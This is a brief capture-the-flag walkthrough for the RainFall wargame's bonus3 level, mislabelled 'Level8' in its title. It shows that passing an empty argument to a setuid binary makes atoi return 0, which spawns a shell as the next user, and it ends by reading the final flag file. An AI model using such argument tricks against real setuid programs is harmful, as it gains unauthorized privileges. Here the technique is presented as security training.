# Level8 Walkthrough

## Analyzing the Program with GDB or Ghidra

1. **Disassemble the program functions**:
    There is some functions: 
    - `atoi` : if i send nothing, it'll return 0

## Running the program

    We ran the program with the following command:  
    ```bash
    bonus3@RainFall:~$ ./bonus3 hello

    bonus3@RainFall:~$ ./bonus3 hello fgq
    bonus3@RainFall:~$ ./bonus3 hel

    bonus3@RainFall:~$ ./bonus3 dqw

    bonus3@RainFall:~$ ./bonus3 dqw gqegqe
    bonus3@RainFall:~$ ./bonus ""
    bash: ./bonus: No such file or directory
    bonus3@RainFall:~$ ./bonus3 ""
    $ whoami
    end
    ```
    By surprise, i found it. 

    Apparently, if strcmp lead to 0 we'll go to execvl cmd for the shell, if we put an empty string, `atoi` will return 0 since the string does not contain a numeric value. 
    
    

## Moving to the end

1. **Swith User to end**:
    Run ```su end```

2. **Congratulations**:
    We used the password we found, and then : 
    ```bash
    end@RainFall:~$ ls -l
    total 4
    -rwsr-s---+ 1 end users 26 Sep 23  2015 end
    end@RainFall:~$ cat end
    Congratulations graduate!
    end@RainFall:~$ 
    ```